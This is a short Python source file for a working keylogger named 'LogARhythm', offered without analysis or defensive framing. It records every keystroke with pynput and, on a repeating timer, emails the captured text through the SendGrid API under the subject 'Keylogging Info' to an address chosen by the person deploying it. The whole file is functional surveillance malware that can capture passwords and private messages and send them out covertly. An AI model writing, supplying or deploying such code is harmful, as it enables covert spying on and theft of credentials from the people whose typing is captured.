import pynput.keyboard
import threading
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail


class LogARhythm:
    def __init__(self, time_interval, api_key, email):
        self.log = "Keylogger initiated"
        self.interval = time_interval
        self.key = api_key
        self.email = email

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def send_mail(self, message):
        message = Mail(
            from_email=self.email,
            to_emails=self.email,
            subject="Keylogging Info",
            plain_text_content=message)
        sg = SendGridAPIClient(self.key)
        sg.send(message)